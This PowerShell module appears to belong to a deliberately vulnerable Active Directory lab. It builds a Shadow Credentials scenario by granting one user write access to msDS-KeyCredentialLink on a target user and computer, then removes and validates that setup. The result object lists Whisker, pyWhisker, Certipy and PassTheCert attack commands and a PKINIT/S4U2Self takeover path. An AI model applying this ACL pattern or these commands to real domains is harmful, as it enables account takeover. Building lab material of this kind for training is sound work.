#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests Shadow Credentials scenarios for VulnAD.

.DESCRIPTION
    This module creates a misconfiguration where an attacker-controlled user has
    WriteProperty access to the msDS-KeyCredentialLink attribute on both a user and
    a computer object. This allows the attacker to add their own key credentials
    and authenticate via PKINIT, effectively taking over the target account without
    knowing its password.

    MITRE ATT&CK: T1556 - Modify Authentication Process

.NOTES
    Module:     VulnAD
    Component:  Shadow Credentials
    Author:     VulnAD Project
#>

function Deploy-ShadowCreds {
    <#
    .SYNOPSIS
        Deploys Shadow Credentials misconfiguration scenarios.
    .DESCRIPTION
        Creates an attacker user with WriteProperty on msDS-KeyCredentialLink for
        a target user and a target computer, enabling PKINIT-based account takeover.
    .PARAMETER Difficulty
        Scenario difficulty: Easy, Medium, or Hard.
    .PARAMETER DomainDN
        The distinguished name of the domain (e.g., DC=contoso,DC=com).
    .PARAMETER Domain
        The FQDN of the domain (e.g., contoso.com).
    .EXAMPLE
        Deploy-ShadowCreds -Difficulty Medium -DomainDN 'DC=lab,DC=local' -Domain 'lab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    begin {
        $scenarioName = 'Shadow Credentials'
        Write-VulnStatus -Message "Deploying $scenarioName scenario ($Difficulty)..." -Type Info
        $createdObjects = [System.Collections.Generic.List[string]]::new()

        # GUID for msDS-KeyCredentialLink
        $keyCredLinkGuid = [System.Guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063'
    }

    process {
        try {
            # ---------------------------------------------------------------
            # 1. Create Attacker User
            # ---------------------------------------------------------------
            $pw1 = Get-VulnPassword -Difficulty $Difficulty -Index 0

            $attackerUser = New-VulnUser -SamAccountName 'e.wright' `
                                        -Name 'Emily Wright' `
                                        -Password $pw1 `
                                        -DomainDN $DomainDN `
                                        -Description 'Application Developer'
            $createdObjects.Add("CN=Emily Wright,OU=Users,OU=ADMonolith,$DomainDN")

            Write-VulnResult -Name 'e.wright' -Detail 'Application Developer (attacker user) created' -Success $true

            # ---------------------------------------------------------------
            # 2. Create Target User
            # ---------------------------------------------------------------
            $pw2 = Get-VulnPassword -Difficulty $Difficulty -Index 1

            $targetUser = New-VulnUser -SamAccountName 'p.hall' `
                                      -Name 'Patrick Hall' `
                                      -Password $pw2 `
                                      -DomainDN $DomainDN `
                                      -Description 'Operations Manager'
            $createdObjects.Add("CN=Patrick Hall,OU=Users,OU=ADMonolith,$DomainDN")

            Write-VulnResult -Name 'p.hall' -Detail 'Operations Manager (target user) created' -Success $true

            # ---------------------------------------------------------------
            # 3. Grant e.wright WriteProperty on msDS-KeyCredentialLink for p.hall
            # ---------------------------------------------------------------
            try {
                $attackerObj = Get-ADUser -Identity 'e.wright' -ErrorAction Stop
                $attackerSID = [System.Security.Principal.SecurityIdentifier]$attackerObj.SID

                $targetDN = (Get-ADUser -Identity 'p.hall' -ErrorAction Stop).DistinguishedName
                $targetPath = "AD:\$targetDN"
                $acl = Get-Acl -Path $targetPath -ErrorAction Stop

                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $attackerSID,
                    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $keyCredLinkGuid
                )
                $acl.AddAccessRule($ace)
                Set-Acl -Path $targetPath -AclObject $acl -ErrorAction Stop

                Write-VulnResult -Name 'Shadow Creds ACL (User)' `
                                 -Detail 'e.wright granted WriteProperty on msDS-KeyCredentialLink for p.hall' `
                                 -Success $true
            }
            catch {
                Write-VulnStatus -Message "Failed to set user Shadow Credentials ACL: $_" -Type Error
                Write-VulnResult -Name 'Shadow Creds ACL (User)' -Detail $_.Exception.Message -Success $false
            }

            # ---------------------------------------------------------------
            # 4. Create Target Computer
            # ---------------------------------------------------------------
            $serversOU = "OU=Servers,OU=ADMonolith,$DomainDN"

            # Ensure Servers OU exists
            try {
                Get-ADOrganizationalUnit -Identity $serversOU -ErrorAction Stop | Out-Null
            }
            catch {
                New-ADOrganizationalUnit -Name 'Servers' `
                                        -Path "OU=ADMonolith,$DomainDN" `
                                        -ProtectedFromAccidentalDeletion $false `
                                        -ErrorAction Stop
                $createdObjects.Add($serversOU)
            }

            try {
                New-ADComputer -Name 'VULN-SRV01' `
                               -SamAccountName 'VULN-SRV01$' `
                               -Path $serversOU `
                               -Enabled $true `
                               -Description 'VulnAD Shadow Credentials target server' `
                               -ErrorAction Stop
                $createdObjects.Add("CN=VULN-SRV01,$serversOU")
                Write-VulnResult -Name 'VULN-SRV01' -Detail 'Target computer created in Servers OU' -Success $true
            }
            catch [Microsoft.ActiveDirectory.Management.ADIdentityAlreadyExistsException] {
                Write-VulnStatus -Message 'VULN-SRV01 already exists, skipping creation.' -Type Warning
                Write-VulnResult -Name 'VULN-SRV01' -Detail 'Computer already exists' -Success $true
            }

            # ---------------------------------------------------------------
            # 5. Grant e.wright WriteProperty on msDS-KeyCredentialLink for VULN-SRV01
            # ---------------------------------------------------------------
            try {
                $computerDN = (Get-ADComputer -Identity 'VULN-SRV01' -ErrorAction Stop).DistinguishedName
                $computerPath = "AD:\$computerDN"
                $acl = Get-Acl -Path $computerPath -ErrorAction Stop

                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $attackerSID,
                    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    $keyCredLinkGuid
                )
                $acl.AddAccessRule($ace)
                Set-Acl -Path $computerPath -AclObject $acl -ErrorAction Stop

                Write-VulnResult -Name 'Shadow Creds ACL (Computer)' `
                                 -Detail 'e.wright granted WriteProperty on msDS-KeyCredentialLink for VULN-SRV01' `
                                 -Success $true
            }
            catch {
                Write-VulnStatus -Message "Failed to set computer Shadow Credentials ACL: $_" -Type Error
                Write-VulnResult -Name 'Shadow Creds ACL (Computer)' -Detail $_.Exception.Message -Success $false
            }

            Write-VulnResult -Name $scenarioName -Detail 'Deployment complete' -Success $true -IsLast

            # ---------------------------------------------------------------
            # 6. Build result object
            # ---------------------------------------------------------------
            $result = @{
                Scenario       = $scenarioName
                Description    = @(
                    "Emily Wright (e.wright) has WriteProperty access to the msDS-KeyCredentialLink attribute"
                    "on both Patrick Hall (p.hall) and the computer VULN-SRV01. This allows e.wright to add"
                    "shadow credentials (key credentials) to these objects and authenticate via PKINIT without"
                    "knowing the target's password, effectively taking over both accounts."
                ) -join ' '
                CreatedObjects = $createdObjects.ToArray()
                AttackCommands = @(
                    "# Whisker — Add shadow credentials to user"
                    "Whisker.exe add /target:p.hall /domain:$Domain /dc:<DC_FQDN>"
                    ""
                    "# Whisker — Add shadow credentials to computer"
                    "Whisker.exe add /target:VULN-SRV01$ /domain:$Domain /dc:<DC_FQDN>"
                    ""
                    "# pyWhisker — Python-based shadow credentials"
                    "python3 pywhisker.py -d $Domain -u 'e.wright' -p '$pw1' --target 'p.hall' --action 'add' --dc-ip <DC_IP>"
                    ""
                    "# Certipy — Shadow credentials via certificate abuse"
                    "certipy shadow auto -username 'e.wright@$Domain' -password '$pw1' -account 'p.hall' -dc-ip <DC_IP>"
                    ""
                    "# PassTheCert — Authenticate with the certificate obtained from shadow credentials"
                    "PassTheCert.exe --server <DC_FQDN> --cert-path shadow.pfx --elevate"
                )
                AttackPath     = @(
                    '1. Identify users/computers where the attacker has WriteProperty on msDS-KeyCredentialLink (BloodHound).'
                    '2. Use Whisker or pyWhisker to add a key credential to the target object.'
                    '3. The tool outputs a certificate and Rubeus command for PKINIT authentication.'
                    '4. Use the certificate to request a TGT via PKINIT (Rubeus asktgt /certificate:...).'
                    '5. Use the TGT for lateral movement or privilege escalation.'
                    '6. For computer accounts, use S4U2Self to obtain service tickets as any user.'
                )
                MitreID        = 'T1556'
                Difficulty     = $Difficulty
            }

            return $result
        }
        catch {
            Write-VulnStatus -Message "Failed to deploy $scenarioName scenario: $_" -Type Error
            throw
        }
    }
}

function Remove-ShadowCreds {
    <#
    .SYNOPSIS
        Removes all objects created by Deploy-ShadowCreds.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    Write-VulnStatus -Message 'Removing Shadow Credentials scenario...' -Type Info

    $keyCredLinkGuid = [System.Guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063'

    # Remove ACLs from p.hall
    try {
        $attackerObj = Get-ADUser -Identity 'e.wright' -ErrorAction Stop
        $attackerSID = $attackerObj.SID

        $targetDN = (Get-ADUser -Identity 'p.hall' -ErrorAction Stop).DistinguishedName
        $acl = Get-Acl -Path "AD:\$targetDN" -ErrorAction Stop

        $rulesToRemove = $acl.Access | Where-Object {
            $_.ObjectType -eq $keyCredLinkGuid -and
            (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
        }
        foreach ($rule in $rulesToRemove) { $acl.RemoveAccessRule($rule) | Out-Null }
        Set-Acl -Path "AD:\$targetDN" -AclObject $acl -ErrorAction Stop
        Write-VulnResult -Name 'Shadow Creds ACL (p.hall)' -Detail 'ACL cleaned' -Success $true
    }
    catch {
        Write-VulnResult -Name 'Shadow Creds ACL (p.hall)' -Detail "Cleanup failed: $_" -Success $false
    }

    # Remove ACLs from VULN-SRV01
    try {
        $computerDN = (Get-ADComputer -Identity 'VULN-SRV01' -ErrorAction Stop).DistinguishedName
        $acl = Get-Acl -Path "AD:\$computerDN" -ErrorAction Stop

        $rulesToRemove = $acl.Access | Where-Object {
            $_.ObjectType -eq $keyCredLinkGuid -and
            (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
        }
        foreach ($rule in $rulesToRemove) { $acl.RemoveAccessRule($rule) | Out-Null }
        Set-Acl -Path "AD:\$computerDN" -AclObject $acl -ErrorAction Stop
        Write-VulnResult -Name 'Shadow Creds ACL (VULN-SRV01)' -Detail 'ACL cleaned' -Success $true
    }
    catch {
        Write-VulnResult -Name 'Shadow Creds ACL (VULN-SRV01)' -Detail "Cleanup failed: $_" -Success $false
    }

    # Remove users
    foreach ($sam in @('e.wright', 'p.hall')) {
        try {
            Remove-ADUser -Identity $sam -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name $sam -Detail 'User removed' -Success $true
        }
        catch {
            Write-VulnResult -Name $sam -Detail "Removal failed: $_" -Success $false
        }
    }

    # Remove computer
    try {
        Remove-ADComputer -Identity 'VULN-SRV01' -Confirm:$false -ErrorAction Stop
        Write-VulnResult -Name 'VULN-SRV01' -Detail 'Computer removed' -Success $true
    }
    catch {
        Write-VulnResult -Name 'VULN-SRV01' -Detail "Removal failed: $_" -Success $false
    }

    Write-VulnResult -Name 'Shadow Credentials' -Detail 'Cleanup complete' -Success $true -IsLast
}

function Test-ShadowCreds {
    <#
    .SYNOPSIS
        Validates that the Shadow Credentials scenario is correctly deployed.
    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$DomainDN
    )

    $results = @{}
    $keyCredLinkGuid = [System.Guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063'

    # Check users
    foreach ($sam in @('e.wright', 'p.hall')) {
        try {
            Get-ADUser -Identity $sam -ErrorAction Stop | Out-Null
            $results[$sam] = $true
        }
        catch {
            $results[$sam] = $false
        }
    }

    # Check computer
    try {
        Get-ADComputer -Identity 'VULN-SRV01' -ErrorAction Stop | Out-Null
        $results['VULN-SRV01'] = $true
    }
    catch {
        $results['VULN-SRV01'] = $false
    }

    # Check ACL on p.hall
    if ($results['e.wright'] -and $results['p.hall']) {
        try {
            $attackerSID = (Get-ADUser -Identity 'e.wright' -ErrorAction Stop).SID
            $targetDN = (Get-ADUser -Identity 'p.hall' -ErrorAction Stop).DistinguishedName
            $acl = Get-Acl -Path "AD:\$targetDN" -ErrorAction Stop

            $keyCredAces = $acl.Access | Where-Object {
                $_.ObjectType -eq $keyCredLinkGuid -and
                $_.ActiveDirectoryRights -match 'WriteProperty' -and
                (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
            }
            $results['KeyCredentialLink ACL (p.hall)'] = ($null -ne $keyCredAces -and @($keyCredAces).Count -ge 1)
        }
        catch {
            $results['KeyCredentialLink ACL (p.hall)'] = $false
        }
    }
    else {
        $results['KeyCredentialLink ACL (p.hall)'] = $false
    }

    # Check ACL on VULN-SRV01
    if ($results['e.wright'] -and $results['VULN-SRV01']) {
        try {
            $computerDN = (Get-ADComputer -Identity 'VULN-SRV01' -ErrorAction Stop).DistinguishedName
            $acl = Get-Acl -Path "AD:\$computerDN" -ErrorAction Stop

            $keyCredAces = $acl.Access | Where-Object {
                $_.ObjectType -eq $keyCredLinkGuid -and
                $_.ActiveDirectoryRights -match 'WriteProperty' -and
                (try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $attackerSID } catch { $false })
            }
            $results['KeyCredentialLink ACL (VULN-SRV01)'] = ($null -ne $keyCredAces -and @($keyCredAces).Count -ge 1)
        }
        catch {
            $results['KeyCredentialLink ACL (VULN-SRV01)'] = $false
        }
    }
    else {
        $results['KeyCredentialLink ACL (VULN-SRV01)'] = $false
    }

    $allPassed = $results.Values -notcontains $false

    foreach ($key in $results.Keys) {
        $isLast = ($key -eq ($results.Keys | Select-Object -Last 1))
        Write-VulnResult -Name $key -Detail $(if ($results[$key]) { 'Validated' } else { 'Missing' }) `
                         -Success $results[$key] -IsLast:$isLast
    }

    return $allPassed
}

Export-ModuleMember -Function Deploy-ShadowCreds, Remove-ShadowCreds, Test-ShadowCreds

